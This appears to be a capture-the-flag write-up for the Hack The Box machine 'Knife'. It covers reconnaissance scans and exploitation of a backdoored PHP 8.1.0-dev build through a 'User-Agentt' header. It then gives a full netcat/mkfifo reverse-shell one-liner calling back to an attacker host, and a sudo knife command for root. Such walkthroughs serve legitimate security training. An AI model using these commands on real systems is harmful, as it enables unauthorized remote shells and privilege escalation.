<b>

# Information Gathering
I started by pinging the box 4 times to ensure stable connection
`ping -c 4 10.10.10.242`
```
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=108 ms
64 bytes from 10.10.10.242: icmp_seq=2 ttl=63 time=109 ms
64 bytes from 10.10.10.242: icmp_seq=3 ttl=63 time=110 ms
64 bytes from 10.10.10.242: icmp_seq=4 ttl=63 time=109 ms
```
After confirming good connection i ran `nmap` with `-Pn` to skip testing if the target is alive and `-sVC` for version and additional information
`nmap -sVC -Pn 10.10.10.242`
```
Nmap scan report for 10.10.10.242
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I also ran `whatweb` with `-a 3` for aggressive (comprehensive) information gathering about the website
`whatweb -a 3 10.10.10.242`
```
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
The website didn't appear to have any links or directories so i try dirbusting with `feroxbuster` but no use either
`feroxbuster -r -k -E -g -C 400,403,404 --auto-tune -u http://10.10.10.242/`
```
200      GET      220l      526w     5815c http://10.10.10.242/
[####################] - 68s    30002/30002   0s      found:1       errors:0      
[####################] - 67s    30000/30000   447/s   http://10.10.10.242/ 
```
I try `dirsearch` just to be sure but no luck either
`dirsearch -F --crawl -u http://10.10.10.242/`
```
[12:10:02] 403 -  277B  - /.ht_wsr.txt                                      
[12:10:02] 403 -  277B  - /.htaccess.bak1                                   
[12:10:02] 403 -  277B  - /.htaccess.orig                                   
[12:10:02] 403 -  277B  - /.htaccess.sample                                 
[12:10:02] 403 -  277B  - /.htaccess.save
[12:10:02] 403 -  277B  - /.htaccess_extra                                  
[12:10:02] 403 -  277B  - /.htaccess_orig
[12:10:02] 403 -  277B  - /.htaccessBAK
[12:10:02] 403 -  277B  - /.htaccessOLD
[12:10:02] 403 -  277B  - /.htaccessOLD2
[12:10:02] 403 -  277B  - /.htaccess_sc
[12:10:02] 403 -  277B  - /.htm                                             
[12:10:02] 403 -  277B  - /.html
[12:10:02] 403 -  277B  - /.htpasswd_test                                   
[12:10:02] 403 -  277B  - /.htpasswds                                       
[12:10:02] 403 -  277B  - /.httr-oauth                                      
[12:10:44] 403 -  277B  - /server-status                                    
[12:10:44] 403 -  277B  - /server-status/ 
```
# Vulnerability Assessment
The server was running `Apache 2.4.41` and using `PHP 8.1.0-dev`
Looking up `php 8.1.0 exploit` leads to this:                
https://www.exploit-db.com/exploits/49933

The cause of the exploit was an early realease which contained a backdoor
The backdoor was removed but any server that still runs this version allows an attacker to execute arbitrary code by sending the `User-Agentt` header
# Exploitation
Running the exploit, it asked for full URL: `http://10.10.10.242/`
After that it spawned `pseudo shell`
# Post-Exploitation
The job control is turned off so i couldn't spawn interactive shell no matter what i tried:
`/bin/sh -i`
`python3 -c 'import pty; pty.spawn("/bin/sh")'`
`perl —e 'exec "/bin/sh";'`

In that case, i opened `netcat` listner on port 4444 and executed reverse shell on the `pseudo shell`
`nc -lvnp 4444` (listener)
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)

Having reverse shell from `nc`, i upgraded to `interactive shell`
`python3 -c 'import pty; pty.spawn("/bin/sh")'`

There was only 1 directory inside `/home` called `james` (which is who we are - `whoami`), the user flag can be found inside `/home/james/user.txt`
After that i started checking common things but the exploits for them didn't work
- `sudo --version` (sudo version)
- `uname -a` (system information)

Running `sudo -l` to see what i can run as sudo led to this
```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Looking up `usr/bin/knife exploit` gave me this
https://gtfobins.github.io/gtfobins/knife/

Running the `sudo knife exec -E 'exec "/bin/sh"'` allowed me to become root
The flag was located at `/root/root.txt`
</b>
